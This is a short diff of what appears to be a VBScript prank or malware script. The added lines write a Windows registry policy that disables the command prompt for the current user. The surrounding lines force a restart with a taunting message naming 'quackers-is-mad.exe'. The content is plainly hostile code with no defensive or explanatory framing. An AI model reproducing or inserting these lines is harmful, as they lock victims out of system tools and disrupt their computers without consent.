@@ -8,6 +8,8 @@ If intAnswer = vbYes Then
 
     If intAnswer = vbYes Then
         ' Wait for 5 seconds before executing further commands
+        oShell.Run "cmd.exe /C REG ADD HKCU\Software\Policies\Microsoft\Windows\System"
+        oShell.Run "cmd.exe /C REG ADD HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 2"
         
         ' Shutdown command
         oShell.Run "cmd.exe /C shutdown /r /c ""quackers-is-mad.exe - U HAVE MADE ME MAD. SAY BYE TO UR PC LOLOLOL"""
